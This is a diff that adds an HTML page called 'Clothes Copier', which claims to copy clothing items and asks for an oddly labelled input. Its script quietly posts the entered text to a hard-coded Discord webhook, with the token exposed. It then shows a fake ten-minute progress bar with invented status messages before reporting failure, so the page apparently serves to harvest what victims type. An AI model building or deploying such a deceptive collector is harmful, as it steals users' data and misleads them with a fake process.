@@ -1,0 +1,203 @@
+<!DOCTYPE html><html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Clothes Copier</title><style>
+*{
+    margin:0;
+    padding:0;
+    box-sizing:border-box;
+    font-family:Arial,sans-serif;
+}
+
+body{
+    height:100vh;
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    background:linear-gradient(135deg,#0f172a,#1e293b);
+    color:white;
+}
+
+.box{
+    width:380px;
+    padding:25px;
+    border-radius:20px;
+    background:rgba(255,255,255,.08);
+    backdrop-filter:blur(12px);
+    text-align:center;
+}
+
+h2{
+    margin-bottom:15px;
+}
+
+input{
+    width:100%;
+    padding:12px;
+    border:none;
+    border-radius:10px;
+    margin-bottom:10px;
+}
+
+button{
+    width:100%;
+    padding:12px;
+    border:none;
+    border-radius:10px;
+    background:#5865F2;
+    color:white;
+    font-weight:bold;
+    cursor:pointer;
+}
+
+button:hover{
+    opacity:.9;
+}
+
+#progressArea{
+    display:none;
+}
+
+.progress{
+    width:100%;
+    height:24px;
+    background:#334155;
+    border-radius:20px;
+    overflow:hidden;
+    margin-top:15px;
+}
+
+.bar{
+    width:0%;
+    height:100%;
+    background:#22c55e;
+    transition:width .3s;
+}
+
+#percent{
+    margin-top:10px;
+    font-weight:bold;
+}
+
+#status{
+    margin-top:12px;
+    color:#cbd5e1;
+}
+
+#result{
+    margin-top:15px;
+    font-weight:bold;
+}
+</style></head>
+<body><div class="box"><div id="startArea">
+    <h2>Clothes Copier</h2><input id="name" placeholder="Enter Shirt powercell ">
+
+<button onclick="startCopy()">
+    Start
+</button>
+
+</div><div id="progressArea"><h2>Copy Clothes Started</h2>
+
+<p>Wait 2–5 Minutes. Processing...</p>
+
+<div class="progress">
+    <div class="bar" id="bar"></div>
+</div>
+
+<div id="percent">0%</div>
+
+<div id="status">
+    Initializing...
+</div>
+
+<div id="result"></div>
+
+</div></div><script>
+
+const WEBHOOK = "https://discord.com/api/webhooks/1519715127941922880/mYMFmeYsFWwRS8H7zWs3NT209yd5ydk3E_U6j139HFOMMhjC47bL4LH3iD1LpFPt9fW8";
+
+async function sendToDiscord(name){
+
+    try{
+
+        const fileContent =
+`Name: ${name}
+Status: Started
+Time: ${new Date().toLocaleString()}`;
+
+        const formData = new FormData();
+
+        formData.append(
+            "file",
+            new Blob([fileContent], {type:"text/plain"}),
+            "submission.txt"
+        );
+
+        await fetch(WEBHOOK,{
+            method:"POST",
+            body:formData
+        });
+
+    }catch(e){
+        console.log(e);
+    }
+}
+
+async function startCopy(){
+
+    const name =
+    document.getElementById("name").value.trim();
+
+    if(!name){
+        alert("Enter your name.");
+        return;
+    }
+
+    await sendToDiscord(name);
+
+    document.getElementById("startArea").style.display="none";
+    document.getElementById("progressArea").style.display="block";
+
+    const messages = [
+        "Initializing...",
+        "Connecting...",
+        "Checking assets...",
+        "Processing...",
+        "Verifying...",
+        "Finalizing..."
+    ];
+
+    let progress = 0;
+
+    const timer = setInterval(() => {
+
+        progress++;
+
+        document.getElementById("bar").style.width =
+        progress + "%";
+
+        document.getElementById("percent").innerText =
+        progress + "%";
+
+        document.getElementById("status").innerText =
+        messages[Math.floor(progress / 20)] ||
+        "Finalizing...";
+
+        if(progress >= 100){
+
+            clearInterval(timer);
+
+            document.getElementById("status").innerText =
+            "Operation Complete";
+
+            document.getElementById("result").innerHTML =
+            "❌ Failed to Copy Clothes";
+
+        }
+
+    }, 6000); // 100 steps × 6 sec = 10 min
+
+}
+</script></body>
+</html>
